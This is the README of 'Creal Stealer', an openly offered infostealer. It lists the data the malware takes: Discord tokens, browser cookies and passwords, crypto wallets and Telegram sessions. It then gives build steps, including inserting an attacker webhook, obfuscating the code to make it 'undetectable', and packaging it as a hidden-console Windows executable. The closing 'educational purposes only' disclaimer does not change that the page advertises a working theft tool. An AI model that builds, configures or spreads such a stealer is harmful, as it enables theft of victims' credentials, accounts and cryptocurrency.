<h1 align="center"> Creal Stealer </h1> 
<p align= "center"> <kbd> <img  src="https://i.imgur.com/MjoICHp.png"width="420"> </kbd><br><br>
<p align="center"><a href="https://t.me/CrealStealer" target="_blank">if you need help join telegram group</a></p>
<p align="center"><a href="https://github.com/Ayhuuu/Creal-Stealer/blob/main/IfYouInfected.md" target="_blank">if you are infected</a></p>





                                                      🤖 Futures

- Startup

- Grab Discord Token, Phone Number, E-mail and HQ Friends.

- Discord Injection

- Grab Browser cookies & passwords

- Grab specials files

- Grab Crypto Wallets. 🦊 Metamask, 🅰️ Atomic, 👾 Exodus

- Grab Telegram


    

                                                      ⬇️ Setup

                                                  
- first open `install.py`

- open `builder.bat`

<div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="https://i.imgur.com/0l34TBS.png"></img></div>

                                                       🖼️ Pictures
 
<div align="center">
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="60%" src="https://i.imgur.com/xmxIWfY.png"></img> 
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/6fSf76T.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/nqSQgqS.png"></img>
    
</div>
 
 
                                                      ⬇️ Setup (Manual)
 
- First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py

- If you use obfuscator it will be undetectable.

- if you have an error while installing try `pip install -r requirements.txt`

- Now You need to use pyinstaller to convert python file to exe.

- Open CMD and type `pip install auto_py_to_exe`

- And after installed `python -m auto_py_to_exe`

- Browse file Select `One file and Windows Based (hide the console)`

<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="40%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/pyy.png"></img>

- And press covert .py .exe

 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">



                                                      ⚠️ Disclaimer

- This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>

                                                      🪪 Licanse

- By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.

<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
